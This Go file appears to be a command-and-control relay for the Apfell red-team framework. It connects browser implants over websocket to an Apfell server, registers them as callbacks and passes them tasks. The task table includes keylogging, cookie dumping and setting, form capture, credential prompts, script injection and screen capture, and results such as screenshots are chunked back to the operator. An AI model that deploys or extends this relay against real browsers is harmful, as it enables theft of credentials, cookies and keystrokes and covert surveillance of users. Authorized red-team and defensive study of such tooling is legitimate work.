package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/gorilla/websocket"
	"log"
	"math"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"time"
)

var conn net.Conn
var upgrader = websocket.Upgrader{}
var clients = map[string]*client{}
var checkedIn bool
var apfellID int
var uniqueID string


type client struct {
	ApfellID int
	CheckedIn bool
}

type metamsg struct {
	MetaType int `json:"metatype"`
	MetaData json.RawMessage `json:"metadata"`
}

type checkinmeta struct {
	MetaType int            `json:"metatype"`
	MetaData checkInMsgData `json:"metadata"`
}

type checkInMsgData struct {
	ApfellID int    `json:"apfellid,omitempty"`
	Hostname string `json:"host,omitempty"`
	IP       string `json:"ip,omitempty"`
	PID      int    `json:"pid,omitempty"`
	User     string `json:"user,omitempty"`
	UUID     string `json:"uuid,omitempty"`
}

type apfellmeta struct {
	MetaType int           `json:"metatype"`
	MetaData apfellMsgData `json:"metadata"`
}

type apfellMsgData struct {
	Type     int    `json:"type,omitempty"`
	ApfellID int    `json:"id,omitempty"`
	UUID     string `json:"uuid,omitempty"`
	Size     int    `json:"size,omitempty"`
	TaskID   int    `json:"taskid,omitempty"`
	TaskType int    `json:"tasktype,omitempty"`
	TaskName string  `json:"taskname,omitempty"`
	Data     string `json:"data,omitempty"`
}

type initmeta struct {
	MetaType int `json:"metatype"`
	MetaData initMsgData `json:"metadata"`
}

type initMsgData struct {
	Stage int `json:"stage"`
	KeyID string `json:"keyid"`
}

const charset = "abcdefghijklmnopqrstuvwxyz" +
	"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

var seededRand *rand.Rand = rand.New(
	rand.NewSource(time.Now().UnixNano()))

func StringWithCharset(length int, charset string) string {
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}

func String(length int) string {
	return StringWithCharset(length, charset)
}

func createInitMessage(stage int, keyID string) []byte {
	msg := initmeta{}

	msg.MetaData.Stage = 2
	msg.MetaData.KeyID = keyID

	dataToSend, err := json.Marshal(msg)
	if err != nil {
		log.Println("Unable to serialize init msg: ", err)
		return make([]byte, 0)
	}

	return dataToSend
}

func createCheckinMessage(apfellid int) interface{} {
	msg := &checkinmeta{}

	msg.MetaData.ApfellID = apfellid
	msg.MetaData.PID = 0
	msg.MetaType = 2

	return msg
}

func createApfellMessage(apfellMsgType int, callbackid int, uid string, size int, taskid int, apfellTaskType int, apfellTaskname string, rawData []byte) interface{} {

	msg := apfellmeta{}

	msg.MetaData.Type = apfellMsgType
	msg.MetaData.ApfellID = callbackid
	msg.MetaData.UUID = uid
	msg.MetaData.TaskID = taskid
	msg.MetaData.TaskType = apfellTaskType
	msg.MetaData.TaskName = apfellTaskname
	msg.MetaData.Size = size
	msg.MetaData.Data = base64.StdEncoding.EncodeToString(rawData)

	msg.MetaType = 3

	return msg
}


func socketHandler(w http.ResponseWriter, r *http.Request)  {
	// Upgrade to a websocket connection
	upgrader.CheckOrigin = func(r *http.Request) bool { return true }
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		ravenlog(fmt.Sprintf("Websocket connection/upgrade failed: %s", err))
		http.Error(w, "Websocket connection failed", http.StatusBadRequest)
		return
	}

	c := make(chan interface{})
	clID := String(8)


	ravenlog("Handling new websocket connection")
	go manageApfell(conn, clID, c)
	go manageClient(conn, clID, c)


}

func manageApfell(c *websocket.Conn, clid string, newtask chan interface{}) {
	defer func() {_ = c.Close()}()

	tasktypes := map[string]int{
		"screencapture": 1,
		"keylog":        2,
		"cookiedump":	 3,
		"cookieset":	 4,
		"cookieremove":  5,
		"tabs":		 	 6,
		"userinfo":		 7,
		"formcapture":   8,
		"prompt"	 :   9,
		"inject":		 10,
		"none":          11,
		"exit":			 12,
	}

	time.Sleep(time.Duration(cf.Interval) * time.Second)
	LOOP:
		for {
			if agent, ok := clients[clid]; ok {
				if agent.CheckedIn == true {
					endpoint := fmt.Sprintf("tasks/callback/%d/nextTask", agent.ApfellID)
					resp := apfellRequest(endpoint, nil, "GET")

					if len(resp) != 0 {
						nextTask := task{}
						err := json.Unmarshal(resp, &nextTask)
						if err != nil {
							log.Println("Unable to unmarshal apfell packet:", err)
							break
						}

						ravenlog(fmt.Sprintf("apfell response: %s", string(resp)))
						taskType, ok := tasktypes[nextTask.Command]

						if ok {
							switch taskType {
							case 11:
								ravenlog("Task command is none")
								break

							case 12:
								size := len(nextTask.Params)
								ravenlog("Tasked to exit the callback")
								meta := createApfellMessage(2, clients[clid].ApfellID, uniqueID, size, nextTask.TaskID, taskType, nextTask.Command, []byte(nextTask.Params))
								ravenlog("Sending new task to client")
								ravenlog(fmt.Sprintf("task: %+v\n", meta))
								newtask<- meta
								break LOOP
							default:
								size := len(nextTask.Params)
								meta := createApfellMessage(2, clients[clid].ApfellID, uniqueID, size, nextTask.TaskID, taskType, nextTask.Command, []byte(nextTask.Params))
								//msg := base64.StdEncoding.EncodeToString(meta)
								ravenlog("Sending new task to client")

								ravenlog(fmt.Sprintf("task: %+v\n", meta))
								newtask<- meta
								break
							}
						}
					}
				}
			}
			time.Sleep(time.Duration(cf.Interval) * time.Second)
	}
}

func manageClient(c *websocket.Conn, clid string, newtask chan interface{}){
	defer func() {_ = c.Close()}()

	for {
		newMsg := metamsg{}
		ravenlog("Reading message from client")

		err := c.ReadJSON(&newMsg)

		if err != nil {
			ravenlog(fmt.Sprintf("error: %v", err))
			if _, ok := clients[clid]; ok {
				clients[clid].CheckedIn = false
			}
			break
		}

		if newMsg.MetaType == 2 {
			// Checkin messages

			cData := checkInMsgData{}

			err := json.Unmarshal([]byte(newMsg.MetaData), &cData)
			if err != nil {
				ravenlog(fmt.Sprintf("Failed to decode metadata: %s", err))
				break
			}
			ravenlog(fmt.Sprintf("Received new checkin message from: %s", cData.User))
			uniqueID = cData.UUID

			data := checkInStruct{}
			data.IP = cData.IP
			data.Pid = cData.PID
			data.UUID = cData.UUID
			data.User = cData.User
			data.Host = cData.Hostname

			j, err := json.Marshal(data)
			if err != nil {
				ravenlog(fmt.Sprintln("Unable to marshal check in data: ", err))
				break
			}

			resp := apfellRequest("callbacks/", j, "POST")
			if len(resp) != 0 {
				r := standardApfellCheckinResponse{}
				_ = json.Unmarshal(resp, &r)


				if strings.Contains(r.Status, "success") {
					clients[clid] = &client{r.ID, true}
					msg := createCheckinMessage(r.ID)
					err = c.WriteJSON(msg)
					if err != nil {
						ravenlog(fmt.Sprintf("Unable to send checkin response to client %s", err))
					}
				}

			}

		} else if newMsg.MetaType == 3 {
			// Apfell messages
			ravenlog("Received new apfell message")
			aData := apfellMsgData{}
			err := json.Unmarshal([]byte(newMsg.MetaData), &aData)
			if err != nil {
				ravenlog("Failed to unmarshal apfell message")
				_ = c.Close()
				break
			}

			if aData.Type == 2 {
				// Task response
				if aData.TaskType == 1 {
					ravenlog("Received screenshot response")
					// Handle screenshots
					rawImage, _ := base64.StdEncoding.DecodeString(aData.Data)
					size := len(rawImage)
					const fileChunk= 512000 //Normal apfell chunk size
					chunks := uint64(math.Ceil(float64(size) / fileChunk))

					fileResponse := taskResponse{}
					apfellMsgData := apfellFileDownloadMetaData{}

					apfellMsgData.TaskID = aData.TaskID
					apfellMsgData.Chunks = int(chunks)
					msg, _ := json.Marshal(apfellMsgData)
					encodedmsg := base64.StdEncoding.EncodeToString(msg)
					fileResponse.Response = encodedmsg

					endpoint := fmt.Sprintf("responses/%d", aData.TaskID)
					dataToSend, _ := json.Marshal(fileResponse)

					resp := apfellRequest(endpoint, dataToSend, "POST")
					ravenlog(fmt.Sprintf("Raw apfell response: %s", string(resp)))

					re := standardApfellResponse{}
					err := json.Unmarshal(resp, &re)
					if err != nil {
						ravenlog(fmt.Sprintf("Unable to unmarshal task response: %s", err))
						break
					}
					r := bytes.NewBuffer(rawImage)
					// https://www.socketloop.com/tutorials/golang-how-to-split-or-chunking-a-file-to-smaller-pieces
					for i := uint64(0); i < chunks; i++ {
						time.Sleep(3 * time.Second)
						partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
						partBuffer := make([]byte, partSize)

						read, err := r.Read(partBuffer)
						if err != nil {
							ravenlog(fmt.Sprintf("Error reading chunk %s", err))
							break
						}

						ravenlog(fmt.Sprintf("Read %d bytes", read))

						// Send the chunk to apfell
						apfellMsg := taskResponse{}
						apfellMsgData := fileChunkMetaData{}

						apfellMsgData.FileID = re.FileID
						apfellMsgData.ChunkNum = int(i) + 1
						apfellMsgData.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
						ravenlog(fmt.Sprintf("Sending chunk %d , with id %d", apfellMsgData.ChunkNum, apfellMsgData.FileID))
						msg, _ := json.Marshal(apfellMsgData)
						apfellMsg.Response = base64.StdEncoding.EncodeToString(msg)
						endpoint := fmt.Sprintf("responses/%d", aData.TaskID)
						dataToSend, _ := json.Marshal(apfellMsg)
						resp := apfellRequest(endpoint, dataToSend, "POST")

						ravenlog(fmt.Sprintf("Raw apfell response: %s", string(resp)))

					}
					finished := taskResponse{}
					finished.Response = base64.StdEncoding.EncodeToString([]byte("download complete"))
					endpoint = fmt.Sprintf("responses/%d", aData.TaskID)
					dataToSend, _ = json.Marshal(finished)
					_ = apfellRequest(endpoint, dataToSend, "POST")

				} else {
					// Every other task can just be sent directly to apfell without modification
					ravenlog(fmt.Sprintf("Received task type: %d", aData.TaskType))
					response := taskResponse{}
					response.Response = aData.Data

					endpoint := fmt.Sprintf("responses/%d", aData.TaskID)
					dataToSend, _ := json.Marshal(response)

					resp := apfellRequest(endpoint, dataToSend, "POST")
					s := standardApfellResponse{}
					err := json.Unmarshal(resp, &s)
					if err != nil {
						ravenlog(fmt.Sprintf("Unable to unmarshal apfell packet:", err))
						break
					}

					ravenlog(fmt.Sprintf("Task result response: %v", s))

				}
			}
		}

		task := <-newtask
		ravenlog("Sending new task to client")
		err = c.WriteJSON(task)

		if err != nil {
			ravenlog(fmt.Sprintf("Error sending message to callback %s", err))
			clients[clid].CheckedIn = false
		}


	}
}


